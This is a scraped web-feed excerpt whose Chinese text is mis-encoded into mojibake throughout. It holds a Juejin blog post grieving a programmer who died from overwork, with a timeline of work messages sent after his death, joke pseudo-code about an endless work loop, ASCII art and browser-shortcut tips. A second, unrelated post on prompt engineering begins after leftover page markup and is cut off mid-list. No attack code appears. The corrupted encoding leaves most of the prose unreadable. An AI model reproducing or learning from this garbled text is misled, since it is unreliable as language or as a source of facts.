<h2 data-id="heading-0">ğŸ’«å½“â€œåŠªåŠ›â€å˜æˆâ€œæ‹¼å‘½â€</h2>
<p>é«˜å¹¿è¾‰çš„äººç”Ÿè„šæœ¬ï¼Œè¯»èµ·æ¥æ˜¯å¦‚æ­¤ç†Ÿæ‚‰ï¼šä»æ‹®æ®å®¶åº­ä¸­å¥‹æ–—å‡ºæ¥ï¼Œé å…¼èŒå®Œæˆå­¦ä¸šï¼Œå¯¹ä»£ç å……æ»¡çƒ­æƒ…ï¼Œ28å²æˆä¸ºéƒ¨é—¨ç»ç†ï¼Œæ¡Œä¸Šæ”¾ç€ã€Šæ­å–œä½ å½“ä¸Šä¸»ç®¡äº†ã€‹ã€‚</p>
<p>ä»–16å²æ—¶åœ¨æ—¥è®°é‡Œå†™é“ï¼šâ€œå‘½è¿å’ŒæŒ«æŠ˜è®©æˆ‘æ…¢æ…¢æˆé•¿ï¼Œå¿ƒç†å’Œç”Ÿç†çš„å˜åŒ–è®©æˆ‘æ¸…é†’ï¼Œçœ‹é€ç”Ÿæ´»ï¼Œåˆ†ææœªæ¥ï¼Œæ˜¯åŠªåŠ›ï¼ŒåŠªåŠ›å†åŠªåŠ›ã€‚â€</p>
<p>ä½†ä¸çŸ¥ä»ä½•æ—¶èµ·ï¼Œâ€œåŠªåŠ›â€å˜æˆäº†â€œæ‹¼å‘½â€ã€‚</p>
<p>çŒæ­»å‰ä¸€å‘¨ï¼Œä»–æœ€æ—©æ™šä¸Š9:38åˆ°å®¶ï¼Œæœ€æ™š10:47ã€‚è¿™åœ¨æˆ‘ä»¬çš„è¡Œä¸šé‡Œï¼Œä¼¼ä¹å¹¶ä¸ç®—ç‰¹åˆ«å¤¸å¼ çš„æ•°å­—ï¼Œå¯¹å§ï¼Ÿ</p>
<p>ä»¥ä¸‹æ˜¯éƒ¨åˆ†ç½‘å‹è¯„è®ºæˆªå›¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c08a2c2206df419cb0c037166b49a27a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769660604&amp;x-signature=KOqAvdRzdt0GlaFX0AP6751clVg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">â²ï¸æœ€è®½åˆºçš„æ—¶é—´çº¿</h2>
<p>çœ‹çœ‹è¿™ä¸ªæ—¶é—´çº¿ï¼š</p>
<ul>
<li><strong>8:58</strong><br/>
æ‹¨æ‰“120æ€¥æ•‘ç”µè¯</li>
<li><strong>9:46</strong><br/>
è½¬é€åŒ»é™¢ï¼Œâ€œè€ƒè™‘å·²ä¸´åºŠæ­»äº¡â€</li>
<li><strong>10:48</strong><br/>
è¢«æ‹‰å…¥ä¸€ä¸ªå¾®ä¿¡æŠ€æœ¯ç¾¤</li>
<li><strong>11:15</strong><br/>
ç¾¤æ¶ˆæ¯ï¼šâ€œé«˜å·¥å¸®å¿™å¤„ç†ä¸€ä¸‹è¿™ä¸ªè®¢å•â€</li>
<li><strong>13:00</strong><br/>
å®£å‘Šä¸´åºŠæ­»äº¡</li>
<li><strong>21:09</strong><br/>
æ­»äº¡8å°æ—¶åï¼Œç§èŠæ¶ˆæ¯ï¼šâ€œå‘¨ä¸€ä¸€æ—©æœ‰æ€¥ä»»åŠ¡ï¼Œè¦æŠŠè¿™ä¸ªæ”¹ä¸‹â€</li>
</ul>
<hr/>
<p>ä»–çš„å¿ƒè„å·²ç»åœæ­¢è·³åŠ¨ï¼Œä½†å·¥ä½œç¾¤çš„æ¶ˆæ¯è¿˜åœ¨ç»§ç»­ã€‚</p>
<p>ä¸‰å—å±å¹•ï¼Œæ¡Œä¸‹çš„æ‹–é‹ï¼Œè¡Œå†›åºŠï¼Œå¥–æ¯å¥–çŠ¶â€”â€”è¿™äº›æ„æˆäº†ä¸€ä¸ªç°ä»£ç¨‹åºå‘˜çš„"æ ‡å‡†å·¥ä½é…ç½®"ã€‚</p>
<h2 data-id="heading-2">â€¼ï¸æˆ‘ä»¬éƒ½åœ¨è¿è¡Œå±é™©çš„ä»£ç </h2>
<p>ä½œä¸ºä¸€ååŒæ ·32å²çš„ç¨‹åºå‘˜ï¼Œæˆ‘è¯»ç€è¿™ç¯‡æŠ¥é“ï¼Œå†…å¿ƒäº”å‘³æ‚é™ˆã€‚</p>
<p>æˆ‘ä»¬è¿™ä¸€ä»£ç‰›é©¬äººï¼Œæœ‰å¤šå°‘äººåœ¨æ‰§è¡Œè¿™æ ·çš„â€œç”Ÿæ´»ä»£ç â€ï¼Ÿ</p>
<pre><code class="hljs language-scss" lang="scss">publicÂ voidÂ æ—¥å¸¸å¾ªç¯()Â {
Â Â Â Â whileÂ (è¿˜æœ‰ä»»åŠ¡()Â &amp;&amp;Â æ˜¯å¦æ´»ç€())Â {
Â Â Â Â Â Â Â Â ifÂ (deadlineä¸´è¿‘())Â {
Â Â Â Â Â Â Â Â Â Â Â Â åŠ ç­();
Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (èº«ä½“ä¸é€‚())Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â å¿½ç•¥();Â <span class="hljs-comment">//Â ç­‰è¿™ä¸ªé¡¹ç›®ç»“æŸå°±å¥½äº†</span>
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â æ‹¼å‘½å·¥ä½œä¸­
Â Â Â Â Â Â Â Â Â Â .
Â Â Â Â Â Â Â Â Â Â .
Â Â Â Â Â Â Â Â Â Â .
Â Â Â Â }
}

privateÂ booleanÂ è¿˜æœ‰ä»»åŠ¡()Â {
Â Â Â Â <span class="hljs-comment">//Â æ°¸è¿œæœ‰ä»»åŠ¡</span>
Â Â Â Â returnÂ true;
}
</code></pre>
<p>é—®é¢˜åœ¨äºï¼Œè¿™ä¸ªå¾ªç¯æ²¡æœ‰ç»ˆæ­¢æ¡ä»¶ï¼ˆä¹Ÿä¸æ•¢æœ‰ï¼‰ã€‚</p>
<h2 data-id="heading-3">ğŸ¤¦â€â™‚ï¸ä»£ç å¯ä»¥é‡æ„ï¼Œäººç”Ÿåªæœ‰ä¸€æ¬¡ç¼–è¯‘</h2>
<p>æˆ‘ä»¬æ€»è¯´ï¼šâ€œç­‰é¡¹ç›®ä¸Šçº¿å°±è½»æ¾äº†â€ã€â€œç­‰è¿™ä¸ªç‰ˆæœ¬å‘å¸ƒå°±ä¼‘æ¯â€ã€‚ä½†äº’è”ç½‘è¡Œä¸šï¼Œæ°¸è¿œæœ‰ä¸‹ä¸€ä¸ªé¡¹ç›®ã€ä¸‹ä¸€ä¸ªç‰ˆæœ¬ã€‚</p>
<p>é«˜å¹¿è¾‰çš„ç”Ÿå‘½æ°¸è¿œåœåœ¨äº†v1.0ï¼Œæ²¡æœ‰è¿­ä»£æœºä¼šã€‚</p>
<p>ä»–çš„ç¦»å»ä¸åº”è¯¥åªæ˜¯æœ‹å‹åœˆé‡Œçš„ä¸€å£°å¹æ¯ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­å‡Œæ™¨æäº¤ä»£ç ã€‚</p>
<h2 data-id="heading-4">ğŸ¥æœ€åçš„è¯</h2>
<p>å·¥ä½œåŠªåŠ›ä¸Šè¿›å¯ä»¥ï¼Œåˆ«æ‹¼å‘½ã€‚</p>
<p>è¿™å¥è¯æˆ‘æƒ³å¯¹æ‰€æœ‰åŒè¡Œè¯´ï¼Œä¹Ÿå¯¹è‡ªå·±è¯´ã€‚</p>
<p>æˆ‘ä»¬å­¦ä¹ æ•°æ®ç»“æ„ï¼ŒçŸ¥é“æ ˆæº¢å‡ºä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚é‚£ä¹ˆï¼Œå½“ç”Ÿæ´»çš„å·¥ä½œæ ˆå·²ç»æ»¡äº†ï¼Œä¸ºä»€ä¹ˆä¸ç»™è‡ªå·±è®¾ä¸ªè¾¹ç•Œï¼Ÿ</p>
<p>æˆ‘ä»¬è°ƒè¯•ä»£ç ï¼Œä¼šåœ¨å…³é”®ä½ç½®è®¾ç½®æ–­ç‚¹ã€‚é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆä¸åœ¨ç”Ÿæ´»çš„å…³é”®èŠ‚ç‚¹ä¹Ÿè®¾ç½®â€œå¥åº·æ–­ç‚¹â€ï¼Ÿ</p>
<p>é«˜å¹¿è¾‰ï¼Œæ„¿ä½ åœ¨å¦ä¸€ä¸ªä¸–ç•Œä¸å†æœ‰åŠ ç­ï¼Œä¸å†æœ‰deadlineã€‚</p>
<p>è€Œæˆ‘ä»¬è¿™äº›è¿˜åœ¨ç¼–ç çš„äººï¼Œè¯¥å­¦ä¼šç»™è‡ªå·±çš„äººç”Ÿç¨‹åºåŠ ä¸Šä¸€è¡Œæ³¨é‡Šï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby">/<span class="hljs-regexp">/Â è­¦å‘Šï¼šæ­¤ç¨‹åºéœ€å®šæœŸç»´æŠ¤ï¼Œä¸¥ç¦è¶…è´Ÿè·è¿è¡Œ
/</span><span class="hljs-regexp">/Â è®¾è®¡å¯¿å‘½ï¼šå°šä½™å‡ åå¹´
/</span><span class="hljs-regexp">/Â ç»´æŠ¤æŒ‡å—ï¼šæ¯æ—¥ä¼‘çœ 8å°æ—¶ï¼Œæ¯å‘¨å¼ºåˆ¶é‡å¯ä¸¤å¤©
/</span><span class="hljs-regexp">/Â æ¨èæ’ä»¶ï¼šæ¬£èµç¾å¥³ä»¥åˆ·æ–°è§†è§‰ç¼“å­˜
/</span>***
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â .<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â .<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:Â Â 
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â ..<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'
Â *Â Â Â Â Â Â Â Â Â Â Â '</span></span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â .::::::::::
Â *Â Â Â Â Â Â Â Â '</span></span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>..
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â ..<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">``</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:
Â *Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">``</span></span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'Â Â Â Â Â Â Â Â .:::.
Â *Â Â Â Â Â Â Â Â Â Â Â ::::'</span></span>Â Â Â <span class="hljs-string">':::::'</span>Â Â Â Â Â Â Â .<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â Â Â Â Â Â Â Â .<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'Â Â Â Â Â Â ::::Â Â Â Â Â .:::::::'</span></span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â Â Â Â Â Â Â .<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'Â Â Â Â Â Â Â :::::Â Â .:::::::::'</span></span>Â <span class="hljs-string">':::::.
Â *Â Â Â Â Â Â Â .::'</span>Â Â Â Â Â Â Â Â <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'Â Â Â Â Â Â '</span></span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â Â Â Â Â .<span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'Â Â Â Â Â Â Â Â Â ::::::::::::::'</span></span>Â Â Â Â Â Â Â Â Â <span class="hljs-string">``</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>.
Â *Â Â ...<span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:<span class="hljs-string">'Â Â Â Â Â Â Â Â Â Â Â Â Â Â ``::.
Â *Â ````Â '</span></span><span class="hljs-symbol">:</span>.Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">':::::::::'</span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>..
Â *Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">'.:::::'</span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">':'</span><span class="hljs-string">``</span><span class="hljs-string">``</span>..
Â *<span class="hljs-regexp">/
</span></code></pre>
<p>ç”Ÿæ´»ä¸æ˜¯å†²åˆºè·‘ï¼Œè€Œæ˜¯ä¸€åœºé©¬æ‹‰æ¾ã€‚è°ƒæ•´å‘¼å¸ï¼Œä¿æŒèŠ‚å¥ï¼Œæˆ‘ä»¬æ‰èƒ½è·‘å¾—æ›´è¿œâ€”â€”è¿œåˆ°èƒ½å¤Ÿçœ‹åˆ°é‚£äº›æˆ‘ä»¬ä¸ºä¹‹å¥‹æ–—çš„ç¾å¥½æœªæ¥ï¼ŒçœŸæ­£å®ç°çš„é‚£ä¸€å¤©ã€‚</p>
<p><strong>äººç”Ÿçš„ä¸‹åŠåœºï¼Œæœ€ç»ˆæ‹¼çš„æ˜¯å¥åº·;æ„¿æ¯ä¸€ä½å‰è¡Œçš„ç‰›é©¬ï¼Œéƒ½èƒ½ç¨³ç¨³åœ°ã€å¥åº·åœ°ï¼Œèµ°å¥½å±äºè‡ªå·±çš„ä¸‹åŠåœºã€‚</strong></p>
<h2 data-id="heading-5">ğŸŸä»Šæ—¥æ‘¸é±¼å°è´´å£«:ç¬é—´éšå½¢æœ¯</h2>
<p><strong>æ³¨</strong>ï¼šå…ˆè®°ä½<code>Ctrl+Shift+T</code> æ¢å¤åˆšå…³çš„é¡µé¢ ï¼ˆåˆ«é—®æˆ‘ä¸ºä»€ä¹ˆä¼šæœ‰æ³¨ï¼‰</p>
<ul>
<li><code>Ctrl+W</code>ï¼šç§’å…³å½“å‰é¡µé¢ï¼ˆæ— ç—•æ¶ˆå¤±ï¼‰</li>
<li><code>Alt+F4</code>ï¼šç»ˆææ¸…åœºï¼ˆå…³é—­æ•´ä¸ªçª—å£ï¼‰</li>
<li><code>Ctrl+Shift+T</code>ï¼šåæ‚”è¯ï¼ˆå¤æ´»åˆšå…³çš„é¡µé¢ï¼‰</li>
</ul>
<p>ğŸ’¡ æ‘¸é±¼ç²¾é«“ï¼šæ‰‹é€Ÿè¦å¿«ï¼Œå§¿åŠ¿è¦å¸…</p>
<p>å®¶äººä»¬è¿˜æƒ³æœ‰å“ªäº›æ‘¸é±¼æŠ€å·§ï¼Œå¿«æ¥åˆ†äº«ä¸‹å§ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dce8af43156f4a6cb1b4708fac6c1f78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769660604&amp;x-signature=sP5MVMhJFE%2BIc8pAW4Kgwnv3UW8%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 æç¤ºè¯å·¥ç¨‹å’Œä¸Šä¸‹æ–‡å·¥ç¨‹æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7597758250825760778</link>    <guid>https://juejin.cn/post/7597758250825760778</guid>    <pubDate>2026-01-22T04:00:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597758250825760778" data-draft-id="7597746812440231974" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 æç¤ºè¯å·¥ç¨‹å’Œä¸Šä¸‹æ–‡å·¥ç¨‹æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-22T04:00:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="indieAI"/> <meta itemprop="url" content="https://juejin.cn/user/4488643649743614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 æç¤ºè¯å·¥ç¨‹å’Œä¸Šä¸‹æ–‡å·¥ç¨‹æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4488643649743614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    indieAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:00:49.000Z" title="Thu Jan 22 2026 04:00:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å¼•è¨€</h2>
<p>éšç€AIæŠ€æœ¯çš„å¿«é€Ÿå‘å±•ï¼Œæç¤ºè¯å·¥ç¨‹å’Œä¸Šä¸‹æ–‡å·¥ç¨‹å·²æˆä¸º2026å¹´AIåº”ç”¨å¼€å‘çš„æ ¸å¿ƒç«äº‰åŠ›ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨è¿™ä¸¤ä¸ªé¢†åŸŸçš„æœ€ä½³å®è·µï¼Œå¹¶ä»‹ç»ä¸“ä¸šçš„æç¤ºè¯ç®¡ç†å¹³å°Prompt Minderã€‚</p>
<h2 data-id="heading-1">äºŒã€æç¤ºè¯å·¥ç¨‹ï¼šä»"æŒ‡ä»¤è‰ºæœ¯"åˆ°"å·¥ç¨‹ç§‘å­¦"</h2>
<h3 data-id="heading-2">2.1 æ ¸å¿ƒåŸåˆ™</h3>
<h4 data-id="heading-3">æ¸…æ™°æ˜ç¡®</h4>
<p>æ¨¡ç³Šçš„æŒ‡ä»¤ä¼šå¯¼è‡´AIè¾“å‡ºè´¨é‡ä½ä¸‹ï¼Œç”šè‡³åç¦»é¢„æœŸã€‚ä¼˜ç§€çš„æç¤ºè¯åº”è¯¥å…·ä½“ã€æ˜ç¡®ï¼Œé¿å…ä½¿ç”¨æ¨¡ç³Šçš„è¯æ±‡ã€‚</p>
<p>âŒ æ¨¡ç³Šè¡¨è¾¾ï¼šå¸®æˆ‘å†™ç‚¹å…³äºAIçš„ä¸œè¥¿
âœ… æ¸…æ™°è¡¨è¾¾ï¼šè¯·æ’°å†™ä¸€ç¯‡800å­—çš„æ–‡ç« ï¼Œä»‹ç»äººå·¥æ™ºèƒ½åœ¨åŒ»ç–—é¢†åŸŸçš„3ä¸ªåº”ç”¨æ¡ˆä¾‹ï¼ŒåŒ…æ‹¬ï¼š</p>
<ol>
<li>ç–¾ç—…è¯Šæ–­</li>
<li>è¯ç‰©ç ”å‘</li>
<li>æ‚£è€…ç®¡ç†
ç›®æ ‡è¯»è€…æ˜¯å¯¹æŠ€æœ¯æ„Ÿå…´è¶£çš„æ™®é€šå¤§ä¼—ã€‚</li>
</ol>
<h4 data-id="heading-4">ç»“æ„åŒ–è¡¨è¾¾</h4>
<p>ä½¿ç”¨åˆ†éš”ç¬¦å’Œæ ‡ç­¾å¯ä»¥è®©æç¤ºè¯æ›´åŠ æ¸…æ™°ï¼Œä¾¿äºAIç†è§£ã€‚</p>
<p>ã€è§’è‰²ã€‘äº§å“åˆ†æå¸ˆ
ã€ä»»åŠ¡ã€‘åˆ†æç”¨æˆ·åé¦ˆ
